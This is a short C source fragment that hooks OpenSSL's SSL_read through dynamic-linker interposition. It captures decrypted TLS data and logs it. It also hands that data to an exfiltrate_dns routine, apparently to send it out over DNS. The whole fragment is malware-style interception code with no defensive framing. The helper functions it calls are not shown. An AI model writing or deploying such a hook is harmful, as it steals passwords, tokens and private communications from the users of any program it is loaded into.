#include "hooking.h"

static int (*orig_SSL_read)(SSL *ssl, void *buf, int num) = NULL;

int SSL_read(SSL *ssl, void *buf, int num) {
    orig_SSL_read = dlsym(RTLD_NEXT, "SSL_read");
    int bytes = orig_SSL_read(ssl, buf, num);

    if (bytes > 0) {
        log_data(buf, bytes);
        exfiltrate_dns(buf, bytes);
    }

    return bytes;
}